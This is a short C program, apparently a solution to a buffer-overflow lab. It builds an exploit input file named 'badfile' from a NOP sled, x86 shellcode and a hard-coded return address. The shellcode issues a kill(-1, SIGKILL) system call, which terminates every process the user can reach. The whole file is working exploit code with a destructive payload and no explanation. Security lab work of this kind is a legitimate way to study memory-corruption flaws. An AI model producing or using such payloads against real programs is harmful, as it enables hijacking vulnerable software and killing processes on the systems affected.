#include<stdio.h>
#include<string.h>

char ret_addr[] = "\x60\xef\xff\xbf";
char kill_processes_shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

char nop[] = "\x90";

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	int ind = 0;
	for(;ind<401;ind++)
		buff[ind] = nop[0];
	for(int i=0;i<strlen(kill_processes_shellcode);i++){
		buff[ind++] = kill_processes_shellcode[i];
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
	
	//buff[ind] = '\0';
	fwrite(buff,517,1,badf);
	return 0;
}
